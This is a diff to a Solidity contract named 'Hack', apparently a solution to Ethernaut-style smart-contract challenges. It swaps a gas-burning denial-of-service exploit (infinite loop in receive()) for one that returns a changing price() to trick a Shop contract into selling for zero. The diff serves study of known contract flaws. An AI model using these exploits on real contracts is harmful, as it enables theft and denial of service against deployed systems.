@@ -1,18 +1,28 @@
 // SPDX-License-Identifier: WTFPL
 pragma solidity 0.8.7;
 
-interface IDenial {
-    function setWithdrawPartner(address _partner) external;
+interface IShop {
+    function buy() external;
+
+    function isSold() external view returns (bool);
 }
 
 contract Hack {
+    IShop shop;
+
     constructor(address contractAddress) {
-        IDenial(contractAddress).setWithdrawPartner(address(this));
+        shop = IShop(contractAddress);
     }
 
-    receive() external payable {
-        while (1 > 0) {
-            uint i = 1 + 1;
+    function attack() public {
+        shop.buy();
+    }
+
+    function price() public view returns (uint) {
+        if (shop.isSold()) {
+            return 0;
+        } else {
+            return 100;
         }
     }
 }
